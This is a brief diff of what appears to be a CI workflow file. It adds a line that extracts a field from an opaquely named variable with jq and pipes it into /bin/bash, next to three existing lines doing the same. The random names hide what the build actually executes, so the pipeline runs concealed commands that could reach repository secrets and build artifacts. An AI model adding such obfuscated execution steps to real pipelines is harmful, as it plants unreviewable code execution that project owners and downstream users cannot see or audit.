@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$eeuxl1969" | jq -r .o3 | /bin/bash
           echo $l2 | jq -r .q92 | /bin/bash
           echo $h8170 | jq -r .ssbqp2 | /bin/bash
+          echo $pswsp2028 | jq -r .xi722 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
